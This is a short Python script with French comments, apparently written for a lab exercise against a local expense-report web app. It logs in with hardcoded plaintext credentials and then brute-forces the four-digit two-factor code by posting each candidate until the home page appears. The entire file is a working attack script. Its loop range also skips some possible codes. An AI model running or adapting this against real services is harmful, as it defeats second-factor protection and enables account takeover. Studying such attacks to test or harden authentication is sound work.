from requests_html import HTMLSession

# Identifiants connus
identifiants = {
    'login': 'p.ayot',
    'mdp': 'xiej3uuY0'
}

# On utilise HTMLSession avec with pour une fermeture auto à la fin de la structure
with HTMLSession() as s:
    # On se connecte au site avec les identifiants connus
    p = s.post('http://gsb-applifrais/index.php?uc=connexion&action=valideConnexion', data=identifiants)
    # On va boucler sur autant de possibilité de clé que possible
    for i in range(1000, 9999):
        code = {
            'code': i
        }
        # On teste le code
        p = s.post('http://gsb-applifrais/index.php?uc=connexion&action=valideA2fConnexion', data=code)
        # On essaye de récupérer la page d'accueil
        r = s.get('http://gsb-applifrais/index.php', data=code)
        elHTML = r.html.find('.glyphicon-home', first=True)
        # Est-ce que l'on est connecté ?
        if elHTML is not None:
            print("Le code est : ",i)
            # On s'arrête lorsque c'est trouvé !
            break